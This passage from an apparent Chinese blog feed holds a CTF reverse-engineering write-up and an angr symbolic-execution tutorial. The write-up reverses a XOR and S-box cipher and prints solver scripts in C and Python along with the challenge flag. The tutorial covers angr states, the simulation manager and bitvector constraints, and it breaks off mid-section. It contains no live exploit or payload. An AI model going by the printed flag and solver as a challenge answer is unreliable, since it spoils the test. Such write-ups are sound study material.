local_c + 1;    &#125;  &#125;  return;&#125;</code></pre><p><strong>unnamed_function_15</strong>函数就是srand函数，<strong>seed</strong>就是0x194(转过来就是404)，然后进入<strong>unnamed_function_8</strong>进行打乱</p><pre><code class="language-c">void unnamed_function_8(int param1,int param2)&#123;  undefined uVar1;  int iVar2;  byte local_11;  undefined4 i;    if (1 &lt; param2) &#123;    for (i = 0; i &lt; param2 + -1; i = i + 1) &#123;      iVar2 = rand();      iVar2 = i + iVar2 / (0x7fff / (param2 - i) + 1);      uVar1 = *(undefined *)(param1 + iVar2);      *(undefined *)(param1 + iVar2) = *(undefined *)(param1 + i);      *(undefined *)(param1 + i) = uVar1;    &#125;  &#125;  return;&#125;</code></pre><p>先生成一个规定范围的伪随机数，然后进行字符顺序打乱</p><p>回到<strong>unnamed_function_9</strong>函数，然后对字符进行分组处理</p><p>最后进到<strong>unnamed_function_11</strong>函数中进行异或加密，</p><pre><code class="language-c">void unnamed_function_11(int param1,int param2)&#123;  int iVar1;  uint uVar2;  undefined4 local_1c;  byte local_15;  byte local_9;    iVar1 = (int)*(char *)(param2 + iRam00011200) &gt;&gt; 4;  uVar2 = (int)*(char *)(param2 + iRam00011200) &amp; 0xf;  iRam00011200 = iRam00011200 + 1;  unnamed_function_10(0x10ea0,(int)*(char *)(iVar1 * 0x10 + 0x10da0 + uVar2));  for (local_1c = 0; local_1c &lt; 4; local_1c = local_1c + 1) &#123;    *(byte *)(param1 + local_1c) =         *(byte *)(param1 + local_1c) ^ *(byte *)(iVar1 * 0x10 + local_1c * 0x11 + uVar2 + 0x10ea0);    *(byte *)(param1 + local_1c) = *(byte *)(param1 + local_1c) ^ *(byte *)(local_1c + 0x11020);  &#125;  return;&#125;</code></pre><p>对传进来的key，分别取高四位和低四位，作为横坐标和纵坐标，在SboxAes数组中取数，给到一个新的数组，然后再将这个数组和和SboxSm4数组进行异或，得到加密之后的数组，再和flag进行第一次异或，接着flag再和未异或处理之前的key进行第二次异或加密，完成所有加密，最后和密文进行比对。</p><p>密文的地址是<strong>0x10fa0</strong>，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413113825136.png" alt="image-20250413113825136"></p><p>下面就是解密脚本了</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;stdbool.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;unsigned char SboxAes[16][16] = &#123;&#123;0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76&#125;,&#123;0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0&#125;,&#123;0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15&#125;,&#123;0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75&#125;,&#123;0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84&#125;,&#123;0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF&#125;,&#123;0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8&#125;,&#123;0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2&#125;,&#123;0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73&#125;,&#123;0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB&#125;,&#123;0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79&#125;,&#123;0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08&#125;,&#123;0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A&#125;,&#123;0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E&#125;,&#123;0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF&#125;,&#123;0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16&#125;&#125;;int SboxSm4[256] = &#123;0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48&#125;;int keyIndex = 0;char realKey[9] = &quot;TGCTF404&quot;;void xor_box(int* sbox, char keyChar) &#123;for (int i = 0; i &lt; 256; i++) &#123;sbox[i] ^= keyChar;        sbox[i] &amp;= 0xFF;&#125;&#125;void decode(int* group, char* key) &#123;    char Char = key[keyIndex++];    int r = Char &gt;&gt; 4;    int l = (Char &amp; 0x0F);    char keyChar = SboxAes[r][l];    xor_box(SboxSm4, keyChar);    for (int i = 0; i &lt; 4; i++) &#123;        group[i] ^= SboxSm4[(r + i) * 16 + (l + i)];        group[i] ^= realKey[i];    &#125;&#125;int main() &#123;    char flag[33] = &#123; 0 &#125;;    char key[9] = &quot;TGCTF404&quot;;    int index = 0;    srand(404);    int enc[8][4] = &#123;&#123;0x84, 0x1c, 0x6b, 0xf7&#125;,                    &#123;0x49, 0x22, 0xd6, 0x42 &#125;,                    &#123;0x50, 0x7b, 0x42, 0xf4 &#125;,                    &#123;0x46, 0xa9, 0x83, 0x62 &#125;,                    &#123;0xd1, 0x32, 0x80, 0x42 &#125;,                    &#123;0x6a, 0x10, 0xa3, 0xf2 &#125;,                    &#123;0xe2, 0xb8, 0x0b, 0x76 &#125;,                    &#123;0xb0, 0xdc, 0x02, 0x51 &#125;&#125;;    for (int i = 0; i &lt; 8; i++) &#123;        key[i] = (key[i] ^ 0x51) &amp; 0xFF;        printf(&quot;%02x &quot;, key[i]);    &#125;    printf(&quot;\n&quot;);    for (int i = 0; i &lt; 8; i++) &#123;        decode(enc[i], key);    &#125;    for (int i = 0; i &lt; 8; i++) &#123;for (int j = 0; j &lt; 4; j++) &#123;            flag[index++] = enc[i][j] &amp; 0xFF;&#125;&#125;        int n = 32;    for (int i = 0; i &lt; n - 1; i++) &#123;int j = i + rand() / (0x7fff / (n - i) + 1);            printf(&quot;%d &quot;, j);&#125;    printf(&quot;\n&quot;);    printf(&quot;%s&quot;, flag);    return 0;&#125;</code></pre><pre><code class="language-python">enc = &quot;Z49H539c&#123;--6&#125;d4888bTUCf8NeFe--e9&quot;index = [1, 24, 28, 24, 16, 25, 22, 29, 29, 12,         17, 19, 31, 13, 18, 19, 30, 31, 27, 25,         24, 30, 29, 25, 28, 27, 29, 27, 30, 29, 30]enc_list = list(enc)for i in range(len(index) - 1, -1, -1):  # 从最后一个交换开始    j = index[i]    enc_list[i], enc_list[j] = enc_list[j], enc_list[i]print(&quot;&quot;.join(enc_list))</code></pre><p><strong>HZNUCTF{f898-de85-46e-9e43-b9c8}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Angr入门</title>
      <link href="/2025/04/14/Angr%E5%85%A5%E9%97%A8/"/>
      <url>/2025/04/14/Angr%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Angr入门"><a href="#Angr入门" class="headerlink" title="Angr入门"></a>Angr入门</h1><h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h3><p><strong>angr_ctf项目</strong>：<a href="https://github.com/jakespringer/angr_ctf">GitHub - jakespringer&#x2F;angr_ctf</a></p><p>​     angr是一个支持多处理架构的用于二进制文件分析的工具包，它提供了动态符号执行的能力以及多种静态分析的能力。项目创建的初衷，是为了整合此前多种二进制分析方式的优点，并开发一个平台，以供二进制分析人员比较不同二进制分析方式的优劣，并根据自身需要开发新的二进制分析系统和方式。</p><p>​     angr_ctf则是一个专门针对angr的项目，里面有17个angr相关的题目。这些题目只有一个唯一的要求：你需要找出能够使程序输出“Good Job”的输入，这也是符号执行常见的应用场景。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20241005174038492.png" alt="image-20241005174038492"></p><p>前面的18个文件夹分别对应每个题目附件的源码，然后dist文件夹里是编译好的题目附件，均是32bit的.ELF文件，solutions文件夹中则是angr的脚本，scaffold.py是我们做题人所需要补全的文件，里面的？？？ …，都是待补全的，solve.py则是参考答案，但是实践下来发现里面的一些地址数据和脚本是有一些错误的。</p><p>具体练习的脚本都在文件夹里。</p><p>以下文章摘自：</p><p><a href="https://www.cnblogs.com/level5uiharu/p/16925991.html">angr_ctf——从0学习angr（一）：angr简介与核心概念 - Uiharu - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/level5uiharu/p/16932453.html">angr_ctf——从0学习angr（二）：状态操作和约束求解 - Uiharu - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/level5uiharu/p/16935854.html">angr_ctf——从0学习angr（三）：Hook与路径爆炸 - Uiharu - 博客园 (cnblogs.com)</a></p><hr><h3 id="二-Angr核心概念"><a href="#二-Angr核心概念" class="headerlink" title="二.Angr核心概念"></a>二.Angr核心概念</h3><h5 id="1-顶层接口"><a href="#1-顶层接口" class="headerlink" title="1.顶层接口"></a><strong>1.顶层接口</strong></h5><p>​      Project类是angr的主类，也是angr的开始，通过初始化该类的对象，可以将你想要分析的二进制文件加载进来，就像这样：</p><blockquote><pre><code class="language-python">import angrp = angr.Project(&#39;/bin/true&#39;)</code></pre></blockquote><p>​        参数为待分析的文件路径，它是唯一必须传入的参数，此外还有一个比较常用的参数load-options，它指明加载的方式，如下：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20241005175231237.png" alt="image-20241005175231237"></p><p>​          使用angr时最重要的就是效率问题，少加载一些无关结果的库能够提升angr的效率，如下：</p><blockquote><pre><code class="language-python">import angrp = angr.Project(&#39;/bin/true&#39;, auto_load_libs=False)</code></pre></blockquote><p>​          任何附加的参数都会被传递到angr的加载器，即CLE.loader中（CLE 即 CLE Loads Everything的缩写）</p><p>Project类中有许多方法和属性，例如加载的文件名、架构、程序入口点、大小端等等：</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; print(p.arch, hex(p.entry), p.filename, p.arch.bits, p.arch.memory_endness )&lt;Arch AMD64 (LE)&gt; 0x4023c0 /bin/true 64 Iend_LE</code></pre></blockquote><h5 id="2-状态State"><a href="#2-状态State" class="headerlink" title="2.状态State"></a><strong>2.状态State</strong></h5><p>​       Project实际上只是将二进制文件加载进来了，要执行它，实际上是对SimState对象进行操作，它是程序的状态。用docker来比喻，Project相当于开发环境，State则是使用开发环境制作的镜像。</p><p>​        要创建状态，需要使用Project对象中的factory，它还可以用于创建模拟管理器和基本块（后面提到），如下：</p><blockquote><pre><code class="language-python">init_state = p.factory.entry_state()</code></pre></blockquote><p>预设状态有四种方式如下：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20241005182631950.png" alt="image-20241005182631950"></p><p>​        状态包含了程序运行时的一切信息，寄存器、内存的值、文件系统以及<strong>符号变量</strong>等，这些信息的使用等用到时再进一步说明。</p><p>​         entry_state和blank_state是常用的两种方式，后者通常用于跳过一些极大降低angr效率的指令，它们间的对比如下：</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; state = p.factory.entry_state()&gt;&gt;&gt; print(state.regs.rax, state.regs.rip)&lt;BV64 0x1c&gt; &lt;BV64 0x4023c0&gt;</code></pre></blockquote><blockquote><pre><code class="language-python">&gt;&gt;&gt; state = p.factory.blank_state(addr=0x4023c0)&gt;&gt;&gt; print(state.regs.rax, state.regs.rip)&lt;BV64 reg_rax_42_64&#123;UNINITIALIZED&#125;&gt; &lt;BV64 0x4023c0&gt;</code></pre></blockquote><p>​        在blank_state方式中，我们仍将地址设定为程序的入口点，然而rax中的值由于没有初始化，它现在是一个名字，也即符号变量，这是符号执行的基础，后续在细说。</p><p>​       此外，可以看到寄存器中的数据类型并不是int，而是BV64，它是一个位向量（Bit Vector），有关位向量的细节之后再说。</p><h5 id="3-模拟管理器（Simulation-Manager）"><a href="#3-模拟管理器（Simulation-Manager）" class="headerlink" title="3.模拟管理器（Simulation Manager）"></a><strong>3.模拟管理器（Simulation Manager）</strong></h5><p>​         上述方式只是预设了程序开始分析时的状态，我们要分析程序就必须要让它到达下一个状态，这就需要模拟管理器的帮助（简称SM）.</p><p>​        使用以下指令能创建一个SM，它需要传入一个state或者state的列表作为参数：</p><blockquote><pre><code class="language-python">simgr  = p.factory.simgr(state)</code></pre></blockquote><p>SM中有许多列表，这些列表被称为stash，它保存了处于某种状态的state，stash有如下几种：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20241005183019790.png" alt="image-20241005183019790"></p><p>​       默认情况下，state会被存放在active中。</p><p>stash中的state可以通过move()方法来转移，将fulter_func筛选出来的state从from_stash转移到to_stash：</p><blockquote><pre><code class="language-python">simgr.move(from_stash=&#39;deadended&#39;, to_stash=&#39;more_then_50&#39;, filter_func=lambda s: &#39;100&#39; in s.posix.dumps(1))</code></pre></blockquote><p>​        stash是一个列表，可以使用python支持的方式去遍历其中的元素，也可以使用常见的列表操作。但angr提供了一种更高级的方式，在stash名字前加上one_，可以得到stash中的第一个状态，加上mp_，可以得到一个mulpyplexed版本的stash。</p><p>此外，稍微解释一下上面代码中的posix.dumps：</p><blockquote><ul><li>state.posix.dumps(0):表示到达当前状态所对应的程序输入</li><li>state.posix.dumps(1):表示到达当前状态所对应的程序输出</li></ul></blockquote><p>上述代码就是将deadended中输出的字符串包含’100’的state转移到more_then_50这个stash中。</p><p> 可以通过step()方法来让处于active的state执行一个基本块，这种操作不会改变state本身：</p><blockquote><blockquote><blockquote><blockquote><p>state &#x3D; p.factory.entry_state()<br>simgr &#x3D; p.factory.simgr(state)<br>print(state.regs.rax, state.regs.rip)<br>&lt;BV64 0x1c&gt; &lt;BV64 0x4023c0&gt;</p></blockquote></blockquote></blockquote><blockquote><blockquote><blockquote><p>print(simgr.one_active)<br>&lt;SimState @ 0x4023c0&gt;</p></blockquote></blockquote></blockquote><blockquote><blockquote><blockquote><p>simgr.step()<br>&lt;SimulationManager with 1 active&gt;<br>print(simgr.one_active)<br>&lt;SimState @ 0x529240&gt;</p></blockquote></blockquote></blockquote><blockquote><blockquote><blockquote><p>print(state.regs.rax, state.regs.rip)<br>&lt;BV64 0x1c&gt; &lt;BV64 0x4023c0&gt;</p></blockquote></blockquote></blockquote></blockquote><p>最后也是SM最常用的技术：探索技术（explorer techniques）</p><p>可以使用explorer方法去执行某个状态，直到找到目标指令或者active中没有状态为止，它有如下参数：</p><blockquote><ul><li>find：传入目标指令的地址或地址列表，或者一个用于判断的函数，函数以state为形参，返回布尔值</li><li>avoid：传入要避免的指令的地址或地址列表，或者一个用于判断的函数，用于减少路径</li></ul></blockquote><p>此外还有一些搜索策略，之后会集中讲解，默认使用DFS（深度优先搜索）。</p><p>explorer找到的符合find的状态会被保存在simgr.found这个列表当中，可以遍历其中元素获取状态。</p><h5 id="4-符号执行"><a href="#4-符号执行" class="headerlink" title="4.符号执行"></a><strong>4.符号执行</strong></h5><p>​      angr作为一个二进制分析的工具包，但它通常作为符号执行工具更为出名。</p><p>​      符号执行就是给程序传递一个符号而不是具体的值，让这个符号伴随程序运行，当碰见分支时，符号会进入哪个分支呢？</p><p>​      angr的回答是全都进入！angr会保存所有分支，以及分支后的所有分支，并且在分支时，保存进入该分支时的判断条件，通常这些判断条件时对符号的约束。</p><p>​       当angr运行到目标状态时，就可以调用求解器对一路上收集到的约束进行求解，最终得到某个符号能够到达当前状态的值。</p><p>​       例如，程序接收一个int类型的输入，当这个输入大于0小于5时，就会执行某条保存在该程序中，我们希望执行的指令（例如一个后门函数backdoor），具体而言如下图所示：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/3031561-20221129171743462-301356444.png" alt="img"></p><p>​        angr会沿着分支按照某种策略（默认DFS）进行状态搜索，当达到目标状态（也就是backdoor能够执行的状态），此时angr已经收集了两个约束（x&gt;0 以及x&lt;&#x3D;5），那么angr就通过这两个约束对x进行求解，解出来的x值就是能够让程序执行backdoor的输入。</p><p>​       在复杂的程序当中，从一个符号到backdoor的路径可能十分复杂，甚至包含一些加密解密的过程，这时就是angr大显身手的时候了。</p><h5 id="5-寄存器访问"><a href="#5-寄存器访问" class="headerlink" title="5.寄存器访问"></a><strong>5.寄存器访问</strong></h5><p>可以通过<strong>state.regs.寄存器名</strong>来访问和修改寄存器</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; print(state.regs.eax, state.regs.ebx)&lt;BV32 0x1c&gt; &lt;BV32 0x0&gt;&gt;&gt;&gt; state.regs.eax +=1&gt;&gt;&gt; print(state.regs.eax, state.regs.ebx)&lt;BV32 0x1d&gt; &lt;BV32 0x0&gt;</code></pre></blockquote><h5 id="6-栈访问"><a href="#6-栈访问" class="headerlink" title="6.栈访问"></a><strong>6.栈访问</strong></h5><p>栈访问涉及两个寄存器：ebp和esp，以及两个指令：push和pop，对于寄存器的访问与其他寄存器相同</p><p>push和pop指令可以通过以下方法调用</p><blockquote><pre><code class="language-python">state.stack_push(value)state.stack_pop()</code></pre></blockquote><h5 id="6-内存访问"><a href="#6-内存访问" class="headerlink" title="6.内存访问"></a><strong>6.内存访问</strong></h5><p>使用以下两个指令对内存读写：</p><p><strong>读内存-state.memory.load(addr, size,endness)</strong></p><p><strong>写内存-state.memory.store(data,size,endness)</strong></p><p>endness是指使用的大小端，通常应该和程序使用的大小端保持相同，而程序所使用的大小端可以用p.arch.memory_endness查询，因此在对默认值没有把握时，请让<strong>endness&#x3D;p.arch.memory_endness</strong>。</p><p>此外，上述两个函数的size的单位均为字节，示例如下：</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; state.memory.store(0x4000,state.solver.BVV(0x0123456789,40))&gt;&gt;&gt; print(state.memory.load(0x4001,2))&lt;BV16 0x2345&gt;</code></pre></blockquote><p>其中存入地址0x4000处的数据是一个位向量，之后会介绍。</p><h5 id="7-文件操作"><a href="#7-文件操作" class="headerlink" title="7.文件操作"></a><strong>7.文件操作</strong></h5><p>​       angr提供了一个SimFile类用来模拟文件，通过将SimFile对象插入到状态的文件系统中，在使用angr分析程序时就可以使用该文件</p><blockquote><pre><code class="language-python">filename = &#39;test.txt&#39;simfile = angr.storage.SimFile(name=filename, content=data, size=0x40)state.fs.insert(filename, simfile)</code></pre></blockquote><p>上述指令能创建一个SimFile对象，文件名为test.txt，内容为data，输入的内容长度为0x40，单位为字节</p><p>​      之后，使用state.fs.insert方法，将SimFile对象插入到状态的文件系统中，在模拟运行程序时就可以使用这个文件了。</p><h5 id="8-位向量"><a href="#8-位向量" class="headerlink" title="8.位向量"></a><strong>8.位向量</strong></h5><p>​        对于内存、寄存器等进行操作时，不仅可以使用python的int，angr还提供了位向量（Bit Vector，BV）</p><p>​       位向量就是一串比特的序列，这于python中的int不同，例如python中的int提供了整数溢出上的包装。而位向量可以理解为CPU中使用的一串比特流，需要注意的是，angr封装的位向量有两个属性：值以及它的长度</p><p>我们先生成几个位向量：</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; one = state.solver.BVV(1,64)&gt;&gt;&gt; one_hundred = state.solver.BVV(100,64)&gt;&gt;&gt; short_nine = state.solver.BVV(9,27)&gt;&gt;&gt; print(one,one_hundred,short_nine)&lt;BV64 0x1&gt; &lt;BV64 0x64&gt; &lt;BV27 0x9&gt;</code></pre></blockquote><p>BVV能够生成一个位向量，第二个参数表示该位向量的长度，单位为bit</p><p>这些位向量相互之间能够进行运算，但参与运算的位向量的长度必须相同</p><blockquote><blockquote><blockquote><blockquote><p>print(short_nine+1)<br>&lt;BV27 0xa&gt;<br>print(one+one_hundred)<br>&lt;BV64 0x65&gt;<br>print(one+short_nine)<br>Traceback (most recent call last):<br>File “<stdin>“, line 1, in <module><br>File “&#x2F;home&#x2F;kali&#x2F;angr&#x2F;venv&#x2F;lib&#x2F;python3.9&#x2F;site-packages&#x2F;claripy&#x2F;operations.py”, line 50, in _op<br>raise ClaripyOperationError(msg)<br>claripy.errors.ClaripyOperationError: args’ length must all be equal</p></blockquote></blockquote></blockquote></blockquote><p>可以看到，当长度不一样时，claripy会提示“length must all be equal”，同时我们也得知，位向量运算的底层模块时claripy，之后会继续说明claripy</p><p>如果一定要进行长度不相等位向量之间的运算，可以扩展位向量，使用<strong>zero_extend</strong>会用零扩展高位，而<strong>sign_extend</strong>会在此基础上带符号地进行扩展</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; print(one+short_nine.zero_extend(64-27))&lt;BV64 0xa&gt;</code></pre></blockquote><p>请注意zero_extend的参数是扩展多少位，而不是扩展到多少位</p><p>此外，位向量还可以之间与python的int进行运算：</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; print(one+1,one*5)&lt;BV64 0x2&gt; &lt;BV64 0x5&gt;</code></pre></blockquote><p>接下来使用BVS（Bit Vectort Symbol）创建一些符号变量</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; x = state.solver.BVS(&#39;x&#39;,64)&gt;&gt;&gt; y = state.solver.BVS(&#39;y&#39;,64)&gt;&gt;&gt; z = state.solver.BVS(&#39;notz&#39;,64)&gt;&gt;&gt; print(x,y,z)&lt;BV64 x_42_64&gt; &lt;BV64 y_43_64&gt; &lt;BV64 notz_44_64&gt;</code></pre></blockquote><p>​        BVS的参数分别是符号变量名和长度，通过z的例子可以看到，BVS中符号变量名参数会影响位向量的名称，但这与你在angr脚本中使用这个符号变量的变量（也就是z）无关。</p><p>此时对符号变量进行运算，做比较判断，都不会得到一个具体的值，而是将这些操作统统保存到符号变量中：</p><blockquote><p>&gt;&gt;&gt; print(x+1)</p><p>&lt;BV64 x_42_64 + 0x1&gt;</p></blockquote><h5 id="9-符号约束与求解"><a href="#9-符号约束与求解" class="headerlink" title="9.符号约束与求解"></a><strong>9.符号约束与求解</strong></h5><p><strong>a.符号约束</strong></p><p>​        每个符号变量本质上可以看做是一颗抽象语法树（AST），之前单独生成的符号变量<BV64 x_42_64>可以看作是只有一层的AST，对它进行操作实际上是在扩展AST，这样的AST的构造规则如下：</p><blockquote><ul><li>如果AST只有根节点的话，那么它必定是符号变量或位向量</li><li>如果AST有多层，那么叶子节点为符号变量和位向量，其他节点为运算符</li></ul></blockquote><p>其中一个节点的左右孩子可以使用args来访问，节点本身存放的信息则使用op来访问。可以通过下面的例子来理解：</p><blockquote><blockquote><blockquote><blockquote><p>ast &#x3D; (x+5)*(y-1)<br>print(ast)<br>&lt;BV64 (x_45_64 + 0x5) * (y_43_64 - 0x1)&gt;</p></blockquote></blockquote></blockquote><blockquote><blockquote><blockquote><p>print(ast.op)<br><strong>mul</strong></p></blockquote></blockquote></blockquote><blockquote><blockquote><blockquote><p>print(ast.args)<br>(&lt;BV64 x_45_64 + 0x5&gt;, &lt;BV64 y_43_64 - 0x1&gt;)</p></blockquote></blockquote></blockquote><blockquote><blockquote><blockquote><p>print(ast.args[0].op)<br><strong>add</strong>&gt;&gt;&gt; print(ast.args[0].args[0])<br><BV64 x_45_64>&gt;&gt;&gt; print(ast.args[0].args[1])<br>&lt;BV64 0x5&gt;&gt;&gt;&gt; print(ast.args[0].args[1].op)<br>BVV&gt;&gt;&gt; print(ast.args[0].args[1].args)<br>(5, 64)&gt;&gt;&gt; print(ast.args[0].args[0].args)<br>(‘x_45_64’, None, None, None, False, False, None)&gt;&gt;&gt; print(ast.args[0].args[0].op)BVS</p></blockquote></blockquote></blockquote></blockquote><p>可以发现，对单独的节点取op的话，可以得到它的类型（示例中为BVV和BVS）</p><p>之前我们使用BVS创建了符号变量，现在如果对该符号变量进行比较判断操作，会得到如下结果：</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; print(x&gt;0)&lt;Bool x_42_64 &gt; 0x0&gt;</code></pre></blockquote><p>它现在不是一个位向量了，而是一个符号化的布尔类型</p><p>这些布尔类型的值可以通过<strong>is_true</strong>和<strong>is_false</strong>来判断，但对于上述有符号变量参与的布尔类型，它永远为false</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; print(state.solver.is_true(x&gt;0))False&gt;&gt;&gt; print(state.solver.is_false(x&gt;0))False</code></pre></blockquote><p>此外需要注意的是，直接使用比较符号比较两个位向量，通常是默认不带符号的，例子如下：</p><blockquote><blockquote><blockquote><blockquote><p>mfive &#x3D; state.solver.BVV(-5,64)<br>one &#x3D; state.solver.BVV(1,64)<br>print(one&gt;mfive)<br><Bool False><br>print(mfive)<br>&lt;BV64 0xfffffffffffffffb&gt;<br>print(state.solver.is_true(one&gt;mfive))<br>False</p></blockquote></blockquote></blockquote></blockquote><p>-5在内存中以0xfffffffffffffffb存储，作为无符号数，它比1要大</p><p>​       符号约束是一个和状态相关的概念，或者说一个state除了包含内存、寄存器中的值这些信息外，还包含了符号约束，也就是要到达当前状态符号变量所必须满足的条件。</p><p>除了运行程序，SM根据分支收集起来的符号约束之外，也可以自行手动添加约束：</p><blockquote><blockquote><blockquote><blockquote><p>print(x,y)<br><BV64 x_45_64> <BV64 y_43_64><br>state.solver.add(x&gt;y)<br>[<Bool x_45_64 > y_43_64&gt;]<br>state.solver.add(x&gt;5)<br>[<Bool x_45_64 > 0x5&gt;]<br>state.solver.add(x&lt;8)<br>[&lt;Bool x_45_64 &lt; 0x8&gt;]</p></blockquote></blockquote></blockquote></blockquote><p>此时，x必须满足大于5小于8，而y必须满足小于x。</p><p><strong>b.符号求解</strong></p><p>可以使用state.solver.eval(x)来求解当前状态（即state）中的符号约束下，x的值</p><blockquote><pre><code class="language-python">&gt;&gt;&gt; 